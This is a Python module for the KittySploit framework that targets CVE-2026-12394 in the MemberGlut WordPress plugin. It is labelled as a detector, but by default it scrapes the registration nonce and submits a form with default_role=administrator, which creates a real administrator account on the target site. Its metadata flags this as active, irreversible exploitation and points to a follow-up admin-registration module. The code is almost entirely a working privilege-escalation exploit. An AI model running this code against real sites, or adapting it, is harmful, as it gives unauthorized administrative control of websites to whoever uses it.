#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MemberGlut < 1.1.5 unauthenticated administrator registration (CVE-2026-12394)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "memberglut"
_VULN_HIGH = (1, 1, 4)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "MemberGlut CVE-2026-12394 privilege escalation detect",
        "description": (
            "Detects CVE-2026-12394 in MemberGlut WordPress plugin < 1.1.5: front-end registration "
            "accepts default_role=administrator without validation. Confirms register form, version, "
            "and optionally registers a throwaway admin account."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-12394",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-12394",
            "https://wpscan.com/vulnerability/6b126a3e-30d5-4bed-ba47-33e589ec2852/",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-12394.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/memberglut_cve_2026_12394_admin_register",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "memberglut",
            "privesc",
            "unauth",
            "cve-2026-12394",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation", "account_creation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.3,
            "noise": 0.6,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wordpress", "memberglut"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "administrator registration"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/memberglut_cve_2026_12394_admin_register",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "MemberGlut registration page path", required=False)
    active_register = OptBool(
        True,
        "Register throwaway administrator to confirm vulnerability",
        required=False,
    )

    _NONCE_RE = re.compile(r'name="register_nonce"\s*value="([a-f0-9]+)"', re.I)

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _path(self, suffix: str) -> str:
        base = self._wp_base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _fetch_register(self):
        path = self._path((self.register_path or "/register/").strip())
        return self.http_request(method="GET", path=path, allow_redirects=True)

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._wp_base()) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        page = self._fetch_register()
        if not page or page.status_code != 200:
            return False
        body = page.text or ""
        if "register_nonce" not in body or "memberglut_register" not in body:
            return False
        if not self.active_register:
            self.set_info(
                severity="critical",
                reason="MemberGlut registration surface exposed (version may be < 1.1.5)",
                path=self._path(self.register_path or "/register/"),
                cve="CVE-2026-12394",
            )
            return True
        match = self._NONCE_RE.search(body)
        if not match:
            return False
        nonce = match.group(1)
        user = f"ks{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        password = "Cve12394Test1!"
        reg_path = self._path(self.register_path or "/register/")
        post = self.http_request(
            method="POST",
            path=reg_path,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "memberglut_register",
                "register_nonce": nonce,
                "username": user,
                "email": email,
                "password": password,
                "first_name": "a",
                "last_name": "a",
                "default_role": "administrator",
            },
            allow_redirects=False,
        )
        if not post:
            return False
        headers = " ".join(f"{k}:{v}" for k, v in (post.headers or {}).items()).lower()
        if post.status_code not in (302, 200) and "registration_success" not in headers:
            return False
        admin = self.http_request(method="GET", path=self._path("/wp-admin/users.php"), allow_redirects=True)
        if admin and admin.status_code == 200 and "wpbody-content" in (admin.text or "") and "Administrator" in (admin.text or ""):
            self.set_info(
                severity="critical",
                reason=f"MemberGlut CVE-2026-12394 — admin registration succeeded ({user})",
                path=reg_path,
                cve="CVE-2026-12394",
            )
            return True
        self.set_info(
            severity="high",
            reason="MemberGlut registration accepted administrator role parameter",
            path=reg_path,
            cve="CVE-2026-12394",
        )
        return True
